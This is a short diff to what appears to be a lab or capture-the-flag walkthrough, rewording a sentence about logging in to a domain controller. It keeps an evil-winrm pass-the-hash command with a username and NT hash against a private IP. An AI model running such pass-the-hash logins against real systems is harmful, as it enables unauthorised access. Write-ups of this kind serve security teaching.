@@ -606,7 +606,7 @@ Nothing in `the_emperor`'s password state blocks the KDC this time, so the TGT c
 
 ## Shell as the_emperor
 
-We connect with Evil-WinRM using the hash. NTLM authenticates with the hash itself, so there is nothing left to crack.
+We log in to DC01 over WinRM with `the_emperor`'s NT hash.
 
 ```
 evil-winrm -i 10.0.21.50 -u 'the_emperor' -H 'd87640b0d83dc7f90f5f30bd6789b133'
